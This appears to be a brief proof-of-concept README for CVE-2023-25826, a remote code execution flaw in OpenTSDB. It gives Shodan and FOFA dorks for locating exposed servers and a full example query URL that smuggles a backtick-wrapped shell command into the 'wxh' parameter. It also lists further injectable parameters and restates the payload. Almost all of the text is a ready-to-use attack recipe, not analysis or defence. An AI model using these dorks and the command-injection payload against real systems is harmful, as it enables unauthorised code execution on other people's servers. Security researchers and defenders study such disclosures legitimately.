# CVE-2023-25826
![](https://img.shields.io/static/v1?label=Product&message=OpenTSDB&color=blue)
![](https://img.shields.io/static/v1?label=Version&message=All%20Current%20Versions&color=brighgreen)
![](https://img.shields.io/static/v1?label=Vulnerability&message=CVSSv3:%209.8.%20Remote%20Code%20Execution&color=red)


- Shodan dork:
```
http.favicon.hash:407286339
```
- FOFA dork:
```
icon_hash="407286339"
```

### Usage
```
The paramenter wxh needs some sanitation before being used by opentsdb.

See example url:

http://target_url:4242/q?start=2016/04/13-10:21:00&ignore=2&m=sum:jmxdata.cpu&o=&yrange=[0:]&key=out%20right%20top&wxh=1900x770%60id%60&style=linespoint&png

Results in RCE unfortunately

More parameters:

    wxh
    start
    m
    o
    key
    style
```
Payload:
```
%60id%60
```